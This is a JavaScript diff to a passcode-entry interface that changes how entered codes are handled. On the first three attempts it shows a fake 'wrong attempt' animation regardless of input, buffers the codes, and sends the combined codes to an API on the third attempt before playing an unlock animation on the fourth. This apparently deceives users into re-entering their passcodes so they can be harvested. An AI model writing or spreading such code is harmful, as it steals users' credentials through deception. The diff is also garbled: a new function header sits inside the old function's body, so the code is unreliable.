@@ -210,21 +210,33 @@
     // push code into rotating buffer (so hotspot displays exact payload)
     pushLastCode(enteredCode);
 
-    // send combined only on 4th attempt
-    if (attempts >= 1 && attempts <= 3) {
-      // do not send to API yet
+      /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
+  async function handleCompleteAttempt(enteredCode) {
+    let attempts = getAttempts();
+    attempts += 1;
+    setAttempts(attempts);
+
+    // push code into rotating buffer (so hotspot displays exact payload)
+    pushLastCode(enteredCode);
+
+    // 1-2: wrong attempts (no send)
+    if (attempts === 1 || attempts === 2) {
       animateWrongAttempt();
-    } else if (attempts === 4) {
-      const combined = getCombinedLastCodes(); // e.g. "1234,4321,5678,3456"
+    }
+    // 3: send combined last codes
+    else if (attempts === 3) {
+      const combined = getCombinedLastCodes();
       if (combined) sendToAPI(combined);
       animateWrongAttempt();
-    } else if (attempts === 5) {
-      // 5th attempt triggers unlock animation (no send)
+    }
+    // 4: unlock animation (no send)
+    else if (attempts === 4) {
       playUnlockAnimation();
       setTimeout(reset, 300);
     }
 
-    if (attempts >= 5) {
+    // reset counter once we've reached the unlock threshold
+    if (attempts >= 4) {
       setAttempts(0);
     }
   }
@@ -450,4 +462,5 @@
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
 
 })();
+
 
